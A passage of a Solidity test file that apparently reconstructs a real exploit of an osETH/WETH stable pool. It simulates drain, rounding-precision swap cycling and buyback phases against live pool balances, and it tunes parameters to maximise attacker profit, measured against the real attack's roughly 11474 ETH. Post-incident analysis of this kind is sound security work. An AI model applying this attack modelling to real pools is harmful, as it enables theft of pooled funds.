        // This is a GAIN for the attacker, not a cost.
        uint256 cyclingGain = sumAfter < 2 * remain ? 2 * remain - sumAfter : 0;
        // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply
        // Use the real attack's bptTarget = actualSupply * 10030 / 10000 (not bptSold)
        uint256 bptTarget = totalBPT * 10030 / 10000;
        // Phase 2 token↔token swaps don't update storedInvariant, so Phase 3 uses Phase 1's last postInv
        uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptTarget, postStep1Supply, phase1Invariant);
        if (tokensExtracted + cyclingGain < repaymentCost) return 0; // net loss
        return tokensExtracted + cyclingGain - repaymentCost;
    }

    function test_searchRemainBalance() public {
        // Derive trickAmt analytically
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== SEARCH: targetRemainBalance by NET PROFIT ===");
        console.log("trickAmt derived:", trickAmt);

        // Fetch real pool balances to compute full profit
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];   // index 0 = WETH
        uint256 realOSETH = realBal[2];  // index 2 = osETH
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 realD = _getInvariant(realWETH, realOSETH);
        console.log("Real pool WETH:", realWETH);
        console.log("Real pool osETH:", realOSETH);
        console.log("Real D:", realD);
        console.log("BPT actual supply:", totalBPT);

        uint256 testRounds = 40;

        // Phase 1: Coarse scan (step=1000) to find infinite attractors
        // Break early when D converges (stops changing between rounds)
        uint256 attractorCount = 0;
        uint256[100] memory attractorRemain;
        uint256[100] memory attractorDafter;
        uint256[100] memory attractorWafter;
        uint256[100] memory attractorOafter;
        uint256[100] memory attractorBandWidth;
        uint256[100] memory attractorConvergeRound;

        for (uint256 remain = 10000; remain <= 100000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 convergedAt = 0;
            // D drop threshold: 98% of initial D consumed → remaining D <= 2% of initial
            // (empirically D stabilizes around ~1.8% of initial, never reaching 1%)
            uint256 dThreshold = initialD * 2 / 100;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    uint256 curD = _getInvariant(bW, bO);
                    if (curD <= dThreshold && convergedAt == 0) {
                        convergedAt = r + 1; // D dropped 99%+ at this round
                        break;
                    }
                } catch { break; }
            }
            // convergedAt > 0 means D dropped 99%+ (attractor found)
            if (convergedAt > 0 || ok >= testRounds) {
                attractorRemain[attractorCount] = remain;
                attractorDafter[attractorCount] = _getInvariant(bW, bO);
                attractorWafter[attractorCount] = bW;
                attractorOafter[attractorCount] = bO;
                attractorConvergeRound[attractorCount] = convergedAt > 0 ? convergedAt : ok;
                attractorCount++;
            }
        }

        console.log("attractorCount:", attractorCount);

        // Phase 2: For each attractor, compute profit and band width
        console.log("--- Per-attractor profit analysis ---");
        uint256 bestProfit = 0;
        uint256 bestRemain = 0;
        uint256 bestBandWidth = 0;

        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 dAfter = attractorDafter[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];

            // --- Profit computation (high-fidelity simulation) ---
            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);

            // --- Band width (with D drop 99% early break) ---
            uint256 bandStart = 0; uint256 bandEnd = 0;
            for (uint256 r2 = remain > 5000 ? remain - 5000 : 1000; r2 <= remain + 5000; r2 += 100) {
                uint256 bW = r2; uint256 bO = r2; uint256 ok2 = 0;
                uint256 initD2 = _getInvariant(bW, bO);
                uint256 dThresh2 = initD2 * 2 / 100;
                bool converged2 = false;
                for (uint256 r = 0; r < testRounds; r++) {
                    if (bO <= trickAmt + 1) break;
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                        bW = w; bO = o; ok2++;
                        uint256 curD2 = _getInvariant(bW, bO);
                        if (curD2 <= dThresh2) { converged2 = true; break; }
                    } catch { break; }
                }
                if (converged2 || ok2 >= testRounds) {
                    if (bandStart == 0) bandStart = r2;
                    bandEnd = r2;
                }
            }
            uint256 bandWidth = bandEnd >= bandStart ? bandEnd - bandStart : 0;

            attractorBandWidth[a] = bandWidth;

            console.log("remain:", remain, "D_after:", dAfter);
            console.log("  convergedAt:", attractorConvergeRound[a]);
            console.log("  profitWETH:", profitWETH, "bandWidth:", bandWidth);

            // Track best profit for threshold calculation
            if (profitWETH > bestProfit) {
                bestProfit = profitWETH;
            }
        }

        // Phase 3: Among attractors within 1% of max profit AND with sufficient band width,
        // pick the highest remain value.
        // Rationale: profit is essentially constant (~0.5% variation across all attractors),
        // so the real differentiator is robustness (band width) and practicality (high remain
        // = less draining in Step 1 = lower gas).
        // Minimum band width = 50% of the widest band found (filters out fragile outliers
        // like 94000 with bandWidth=1400 vs typical 5700-10000)
        uint256 profitThreshold = bestProfit * 99 / 100;
        uint256 maxBW = 0;
        for (uint256 a = 0; a < attractorCount; a++) {
            if (attractorBandWidth[a] > maxBW) maxBW = attractorBandWidth[a];
        }
        uint256 minBandWidth = maxBW / 2;  // require at least 50% of widest band
        bestRemain = 0;

        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 dAfter = attractorDafter[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];

            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);

            if (profitWETH >= profitThreshold && attractorBandWidth[a] >= minBandWidth && remain > bestRemain) {
                bestRemain = remain;
            }
        }

        console.log("=== BEST RESULT ===");
        console.log("Best targetRemainBalance:", bestRemain);
        console.log("Max profit (WETH wei):", bestProfit);
        console.log("Min band width required:", minBandWidth);

        // Print convergence rounds for all attractors with max profit (within 1%)
        console.log("--- Convergence rounds for top-profit attractors ---");
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];
            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);
            if (profitWETH >= profitThreshold) {
                console.log("  remain:", remain, "convergedAt:", attractorConvergeRound[a]);
                console.log("    profit:", profitWETH);
            }
        }
    }

    /// @notice Find optimal N for the best attractor discovered by test_searchRemainBalance.
    /// Uses the same profit-based selection, then finds N where marginal profit per round
    /// drops below threshold (gas cost exceeds marginal gain).
    function test_findOptimalN() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== FIND OPTIMAL N (profit-based, no hardcoded values) ===");

        // Fetch real pool state
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 realD = _getInvariant(realWETH, realOSETH);

        // Re-discover the best attractor (same profit + band width logic as test_searchRemainBalance)
        uint256 testRounds = 40;
        uint256 bestRemain = _findBestRemain(trickAmt, testRounds, realWETH, realOSETH, totalBPT, realD);
        console.log("Discovered bestRemain:", bestRemain);

        // Now find optimal N: run rounds and track cumulative profit growth
        uint256 maxRounds = 60;
        uint256 balWETH = bestRemain;
        uint256 balOSETH = bestRemain;
        uint256 dInitial = _getInvariant(balWETH, balOSETH);
        uint256 dPrev = dInitial;
        uint256 optimalN = 0;

        for (uint256 r = 0; r < maxRounds; r++) {
            if (balOSETH <= trickAmt + 1) break;
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w; balOSETH = o;
                uint256 dNow = _getInvariant(balWETH, balOSETH);
                uint256 marginal = dPrev > dNow ? dPrev - dNow : 0;
                console.log("Round:", r, "D:", dNow);
                console.log("  marginalD:", marginal);
                // Mark the first round where marginal D-deflation < 0.01% of D_initial
                if (marginal * 10000 < dInitial && optimalN == 0) {
                    optimalN = r;
                }
                dPrev = dNow;
            } catch {
                console.log("Round:", r, "REVERTED");
                break;
            }
        }

        uint256 dFinal = _getInvariant(balWETH, balOSETH);
        uint256 deflBps = (dInitial - dFinal) * 10000 / dInitial;

        console.log("=== RESULT ===");
        console.log("Discovered remain:", bestRemain);
        console.log("Optimal N:", optimalN);
        console.log("D_initial:", dInitial, "D_final:", dFinal);
        console.log("Total D-deflation (bps):", deflBps);
    }


    /// @notice Validate that remain=67000, N=30 produces the correct profit.
    /// Uses high-fidelity simulation for both Step 1 (geometric decay GIVEN_OUT exits)
    /// and Step 3 (geometric series BPT buyback with D recovery).
    function test_validateProfit() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== VALIDATE PROFIT: remain=67000, N=30 ===");

        // Fetch real pool state
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        // Use getActualSupply() which equals virtualSupply + protocolFeeAmount,
        // matching the real pool's preJoinExitSupply after _payProtocolFeesBeforeJoinExit
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        console.log("Real WETH:", realWETH);
        console.log("Real osETH:", realOSETH);
        console.log("BPT supply (actualSupply):", totalBPT);

        uint256 remain = 67000;
        uint256 N = 30;

        // Step 1: simulate sequential GIVEN_OUT BPT→token exits with geometric decay
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        console.log("--- Step 1 (simulated) ---");
        console.log("Tokens extracted:", tokensExtracted);
        console.log("BPT sold:", bptSold);
        console.log("Post-Step1 virtualSupply:", postStep1Supply);
        console.log("Phase1 lastPostJoinExitInvariant:", phase1Inv);

        // Step 2: cycle N rounds, track exact balances
        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
        uint256 balWETH = remain;
        uint256 balOSETH = remain;
        uint256 dBefore = _getInvariant(balWETH, balOSETH);
        console.log("--- Step 2 ---");
        console.log("D before cycling:", dBefore);

        for (uint256 r = 0; r < N; r++) {
            (balWETH, balOSETH) = this.simulateOneRound(balWETH, balOSETH, trickAmt);
        }
        uint256 dAfter = _getInvariant(balWETH, balOSETH);
        console.log("D after cycling:", dAfter);
        console.log("bal after cycling: WETH=", balWETH, "osETH=", balOSETH);

        // Pool lost (2*remain - sumAfter) tokens during cycling → attacker gained them
        uint256 cyclingGain = 2 * remain - (balWETH + balOSETH);
        console.log("Cycling gain (tokens extracted from pool by D-crash):", cyclingGain);

        // Step 3: simulate buying back BPT with dynamic D recovery
        // Phase 3 reads _lastPostJoinExitInvariant from Phase 1 (Phase 2 didn't update it)
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("--- Step 3 ---");
        console.log("bptTarget:", bptTarget);
        uint256 repaymentCost = _simulateStep3RepaymentDebug(balWETH, balOSETH, bptTarget, postStep1Supply, phase1Inv);
        console.log("Repayment cost (tokens to buy back BPT):", repaymentCost);

        // Net profit = tokens left over
        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
        console.log("=== NET PROFIT ===");
        console.log("Profit (token wei):", profit);
        console.log("Profit (ETH):", profit / 1e18);

        // Compare with real attack Pool 1 (osETH/WETH) net deltas
        // Real tx: Pool 1 net: WETH=4623.60, osETH=6851.12, BPT=44.15 => ~11474 ETH
        uint256 realPool1Profit = 11474;
        console.log("--- Real attack Pool 1 profit ~= 11474 ETH ---");
        if (profit / 1e18 >= realPool1Profit) {
            console.log("Formula error (%):", (profit / 1e18 - realPool1Profit) * 100 / realPool1Profit);
        } else {
            console.log("Formula error (%):", (realPool1Profit - profit / 1e18) * 100 / realPool1Profit);
            console.log("(underestimate)");
        }
    }

    /// @notice Fine-grained search around attractor clusters to measure band width
    function test_attractorBandWidth() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== ATTRACTOR BAND WIDTH (step=100) ===");
        uint256 testRounds = 40;

        // Scan around the two candidate clusters
        uint256[2] memory centers = [uint256(67000), uint256(94000)];

        for (uint256 c = 0; c < 2; c++) {
            uint256 center = centers[c];
            uint256 bandStart = 0;
            uint256 bandEnd = 0;
            console.log("--- Cluster around:", center, "---");

            for (uint256 remain = center - 5000; remain <= center + 5000; remain += 100) {
                uint256 balWETH = remain;
                uint256 balOSETH = remain;
                uint256 roundsOk = 0;

                for (uint256 r = 0; r < testRounds; r++) {
                    if (balOSETH <= trickAmt + 1) break;
                    try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                        balWETH = w;
                        balOSETH = o;
                        roundsOk++;
                    } catch { break; }
                }

                if (roundsOk >= testRounds) {
                    if (bandStart == 0) bandStart = remain;
                    bandEnd = remain;
                }
            }

            console.log("Band start:", bandStart, "end:", bandEnd);
            if (bandEnd >= bandStart) {
                console.log("Band width:", bandEnd - bandStart);
            }
        }
    }

    /// @notice Shared helper: find best remain using profit + band width logic.
    /// Among attractors within 1% of max profit AND with bandWidth >= 50% of max,
    /// pick the highest remain (= least Step 1 cost).
    function _findBestRemain(
        uint256 trickAmt,
        uint256 testRounds,
        uint256 realWETH,
        uint256 realOSETH,
        uint256 totalBPT,
        uint256 realD
    ) internal returns (uint256 bestRemain) {
        uint256 attractorCount = 0;
        uint256[50] memory aRemain;
        uint256[50] memory aDafter;
        uint256[50] memory aWafter;
        uint256[50] memory aOafter;
        uint256[50] memory aBandWidth;

        // Coarse scan
        for (uint256 remain = 10000; remain <= 100000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                } catch { break; }
            }
            if (ok >= testRounds) {
                aRemain[attractorCount] = remain;
                aDafter[attractorCount] = _getInvariant(bW, bO);
                aWafter[attractorCount] = bW;
                aOafter[attractorCount] = bO;
                attractorCount++;
            }
        }

        // Fine scan for band width + compute profit
        uint256 bestProfit = 0;
        uint256 maxBW = 0;
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 center = aRemain[a];
            uint256 bandStart = 0; uint256 bandEnd = 0;
            for (uint256 r2 = center > 5000 ? center - 5000 : 1000; r2 <= center + 5000; r2 += 100) {
                uint256 bW = r2; uint256 bO = r2; uint256 ok = 0;
                for (uint256 r = 0; r < testRounds; r++) {
                    if (bO <= trickAmt + 1) break;
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                        bW = w; bO = o; ok++;
                    } catch { break; }
                }
                if (ok >= testRounds) {
                    if (bandStart == 0) bandStart = r2;
                    bandEnd = r2;
                }
            }
            aBandWidth[a] = bandEnd >= bandStart ? bandEnd - bandStart : 0;
            if (aBandWidth[a] > maxBW) maxBW = aBandWidth[a];

            // Compute profit (high-fidelity simulation)
            uint256 profit = _computeProfit(aRemain[a], aWafter[a], aOafter[a], realWETH, realOSETH, totalBPT);
            if (profit > bestProfit) bestProfit = profit;
        }

        // Select: within 1% of max profit, bandWidth >= 50% of max, highest remain
        uint256 profitThreshold = bestProfit * 99 / 100;
        uint256 minBW = maxBW / 2;
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 profit = _computeProfit(aRemain[a], aWafter[a], aOafter[a], realWETH, realOSETH, totalBPT);
            if (profit >= profitThreshold && aBandWidth[a] >= minBW && aRemain[a] > bestRemain) {
                bestRemain = aRemain[a];
            }
        }
    }

    /// @notice Like simulateOneRound but returns intermediate WETH balance and swap3 amount
    function simulateOneRoundDetailed(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 wethAfterSwap12, uint256 swap3Amount) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = bal[1] - trickAmt - 1;
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        wethAfterSwap12 = bal[0];

        // Swap 3: binary search for maximum extractable WETH
        (swap3Amount, bal[0], bal[1]) = this._computeSwap3(bal[0], bal[1]);

        return (bal[0], bal[1], wethAfterSwap12, swap3Amount);
    }

    /// @notice Test how many cycling rounds remain=67000 can sustain under gas constraint.
    function test_maxRoundsAt67000() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 balWETH = 67000;
        uint256 balOSETH = 67000;

        console.log("=== MAX ROUNDS TEST: remain=67000 ===");
        console.log("trickAmt:", trickAmt);
        console.log("Initial gasleft:", gasleft());

        // Track gas per round dynamically
        uint256 lastRoundGas = 0;
        uint256 reserveGas = 100_000;
        uint256 roundCount = 0;

        while (true) {
            // Use last round's gas cost (or a safe initial estimate) to check budget
            uint256 needed = (lastRoundGas > 0 ? lastRoundGas : 500_000) + reserveGas;
            if (gasleft() < needed) {
                console.log("Gas exhausted after rounds:", roundCount);
                console.log("  gasleft:", gasleft());
                break;
            }
            if (balOSETH <= trickAmt + 1) {
                console.log("Stopped: balOSETH too small at round", roundCount);
                break;
            }
            uint256 gasBefore = gasleft();
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w;
                balOSETH = o;
                lastRoundGas = gasBefore - gasleft();
                roundCount++;
            } catch {
                console.log("REVERTED at round:", roundCount);
                break;
            }
        }

        uint256 dFinal = _getInvariant(balWETH, balOSETH);
        console.log("Total rounds completed:", roundCount);
        console.log("Final WETH:", balWETH, "osETH:", balOSETH);
        console.log("Final D:", dFinal);
    }

    /// @notice Compare remain=67000 vs remain=94000 end-to-end
    function test_compareRemains() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 N = 30;

        uint256[2] memory remains = [uint256(67000), uint256(94000)];
        for (uint256 idx = 0; idx < 2; idx++) {
            _compareRemainsOnePass(remains[idx], trickAmt, N, realWETH, realOSETH, totalBPT);
        }
    }

    function _compareRemainsOnePass(
        uint256 remain, uint256 trickAmt, uint256 N,
        uint256 realWETH, uint256 realOSETH, uint256 totalBPT
    ) internal {
        console.log("========== remain =", remain, "==========");

        // Step 1
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        console.log("Step1 tokensExtracted:", tokensExtracted);
        console.log("Step1 bptSold:", bptSold);
        console.log("Step1 postSupply:", postStep1Supply);

        // Step 2 — token↔token swaps don't update _lastPostJoinExitInvariant
        uint256 bW = remain; uint256 bO = remain;
        uint256 dBefore = _getInvariant(bW, bO);
        for (uint256 r = 0; r < N; r++) {
            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
        }
        uint256 dAfter = _getInvariant(bW, bO);
        console.log("Step2 D_before:", dBefore, "D_after:", dAfter);
        console.log("Step2 balW:", bW, "balO:", bO);
        console.log("Step2 D_deflation_bps:", (dBefore - dAfter) * 10000 / dBefore);
        uint256 cyclingGain = 2 * remain - (bW + bO);
        console.log("Step2 cyclingGain:", cyclingGain);

        // Step 3 — uses Phase 1's lastPostJoinExitInvariant
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("Step3 bptTarget:", bptTarget);
        console.log("Step3 postStep1Supply:", postStep1Supply);
        uint256 repaymentCost = _simulateStep3RepaymentDebug(bW, bO, bptTarget, postStep1Supply, phase1Inv);
        console.log("Step3 repaymentCost:", repaymentCost);

        // Profit
        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
        console.log("NET PROFIT (wei):", profit);
        console.log("NET PROFIT (ETH):", profit / 1e18);
        console.log("");
    }


    /// @notice Lightweight landscape scan: which remain values are attractors?
    /// Simulates coarse search strategies an attacker might use.
    function test_profitLandscape() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        console.log("=== PROFIT LANDSCAPE SCAN ===");
        console.log("trickAmt:", trickAmt);

        uint256 testRounds = 40;

        // Scan step=5000 (what a quick first scan would look like)
        console.log("--- Step=5000 scan ---");
        for (uint256 remain = 5000; remain <= 200000; remain += 5000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            if (converged || ok >= testRounds) {
                console.log("  remain:", remain, "rounds:", converged ? ok + 1 : ok);
                console.log("    D_final:", _getInvariant(bW, bO));
            }
        }

        // Scan step=10000 (coarsest practical scan)
        console.log("--- Step=10000 scan ---");
        for (uint256 remain = 10000; remain <= 200000; remain += 10000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            if (converged || ok >= testRounds) {
                console.log("  remain:", remain, "rounds:", converged ? ok + 1 : ok);
                console.log("    D_final:", _getInvariant(bW, bO));
            }
        }

        // Scan step=1000 (fine scan) - just list attractors
        console.log("--- Step=1000 scan (attractors only) ---");
        uint256 prevAttractor = 0;
        uint256 clusterStart = 0;
        uint256 clusterEnd = 0;
        uint256 clusterCount = 0;

        for (uint256 remain = 1000; remain <= 200000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            bool isAttractor = converged || ok >= testRounds;

            if (isAttractor) {
                if (clusterStart == 0 || remain - prevAttractor > 1000) {
                    // New cluster
                    if (clusterStart > 0) {
                        console.log("  Cluster:", clusterCount, "start:", clusterStart);
                        console.log("    end:", clusterEnd);
                    }
                    clusterCount++;
                    clusterStart = remain;
                }
                clusterEnd = remain;
                prevAttractor = remain;
            }
        }
        if (clusterStart > 0) {
            console.log("  Cluster:", clusterCount, "start:", clusterStart);
            console.log("    end:", clusterEnd);
        }
        console.log("Total attractor clusters:", clusterCount);
    }

    /// @notice Debug: observe D changes per round for remain=67000
    function test_debugDConvergence67000() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 balWETH = 67000;
        uint256 balOSETH = 67000;
        uint256 prevD = _getInvariant(balWETH, balOSETH);

        console.log("=== D CONVERGENCE DEBUG: remain=67000 ===");
        console.log("Round 0: D =", prevD);

        for (uint256 r = 0; r < 50; r++) {
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w; balOSETH = o;
                uint256 curD = _getInvariant(balWETH, balOSETH);
                uint256 diff = prevD > curD ? prevD - curD : curD - prevD;
                console.log("Round:", r + 1, "D:", curD);
                console.log("  diff:", diff);
                prevD = curD;
            } catch {
                console.log("REVERTED at round:", r + 1);
                break;
            }
        }
    }

    // ─── Detailed per-token breakdown ───────────────────────────────────

    /// @notice Single-step helper to avoid stack-too-deep in the extraction loop.
    /// Computes BPT burned, protocol fee minted, and returns updated (newBal, newSupply, bptIn).
    /// tokenIndex: 0 = WETH, 1 = osETH. newBal is the post-exit balance of the exited token.
    function _doSingleExitStep(
        uint256 bW,
        uint256 bO,
        uint256 supply,
        uint256 tokenIndex,
        uint256 tokenOut,
        uint256 preInvariant
    ) internal view returns (uint256 newBal, uint256 newSupply, uint256 bptIn, uint256 postInv) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = bW; bal[1] = bO;
        scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
        bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, tokenIndex, tokenOut, supply, amp, swapFeePercentage);
        postInv = _calcPostInvariant(bW, bO, tokenIndex, tokenOut, false);
        uint256 postBW = tokenIndex == 0 ? bW - tokenOut : bW;
        uint256 postBO = tokenIndex == 1 ? bO - tokenOut : bO;
        uint256 postSupply = supply - bptIn;
        uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, supply, postInv, postSupply);
        newBal = tokenIndex == 0 ? postBW : postBO;
        newSupply = postSupply + feeBpt;
    }

    struct Step1DetailedResult {
        uint256 totalWethOut;
        uint256 totalOsethOut;
        uint256 totalBptSold;
        uint256 remainingSupply;
        uint256 lastPostJoinExitInvariant;
    }

    struct Step1BalState {
        uint256 bW;
        uint256 bO;
        uint256 supply;
    }

    function _simulateStep1ExtractionDetailed(
        uint256 realWETH,
        uint256 realOSETH,
        uint256 targetRemain,
        uint256 bptSupply
    ) internal returns (Step1DetailedResult memory r) {
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);

        Step1BalState memory s = Step1BalState({bW: realWETH, bO: realOSETH, supply: bptSupply});

        // Use fresh invariant from current balances for all steps (matches _simulateStep1Extraction).

        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                uint256 preInv = _getInvariant(s.bW, s.bO);
                uint256 bptIn;
                uint256 postInv;
                (s.bW, s.supply, bptIn, postInv) = _doSingleExitStep(s.bW, s.bO, s.supply, 0, wethAmounts[i], preInv);
                r.totalBptSold += bptIn;
                r.totalWethOut += wethAmounts[i];
                r.lastPostJoinExitInvariant = postInv;
                console.log("[SP1] step", i, "WETH supply_after:", s.supply);
            }
            if (i < osethCount) {
                uint256 preInv = _getInvariant(s.bW, s.bO);
                uint256 bptIn;
                uint256 postInv;
                (s.bO, s.supply, bptIn, postInv) = _doSingleExitStep(s.bW, s.bO, s.supply, 1, osethAmounts[i], preInv);
                r.totalBptSold += bptIn;
                r.totalOsethOut += osethAmounts[i];
                r.lastPostJoinExitInvariant = postInv;
                console.log("[SP1] step", i, "OSETH supply_after:", s.supply);
            }
        }
        r.remainingSupply = s.supply;
    }

    /// @notice Debug version with per-step logging matching EXP output format
    function _simulateStep3RepaymentDetailedWithLog(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        console.log("[SP] Phase3 step count:", swapCount);
        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            totalBptBought += bptAmounts[i];
            uint256 preInvariant = _getInvariant(bW, bO);
            // Between-swap fee
            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            supply += beforeFee;
            uint256 preSupply = supply;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW; bal[1] = bO;
            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
            console.log("[SP] Phase3 step", i, "BPT amount:", bptAmounts[i]);
            console.log("[SP]   assetIn:", tokenIndex == 0 ? 0 : 2);
            console.log("[SP]   tokenIn:", amountIn);
            console.log("[SP]   supply:", supply);
            if (beforeFee > 0) {
                console.log("[SP]   beforeSwapFeeBpt:", beforeFee);
            }
